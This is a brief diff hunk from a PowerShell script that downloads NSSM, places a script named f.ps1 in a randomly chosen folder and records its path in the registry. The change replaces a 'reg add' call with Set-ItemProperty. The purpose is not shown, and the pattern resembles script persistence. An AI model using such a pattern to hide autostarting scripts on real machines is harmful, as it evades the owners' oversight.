@@ -23,8 +23,7 @@ $downloadPath = "$env:temp\nssm.zip"
 if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $fwdPath = "$fwdPath\f.ps1"
-    reg add "$basePath" /v $propertyName /t REG_SZ /d $fwdPath /f
-    #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
 }
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
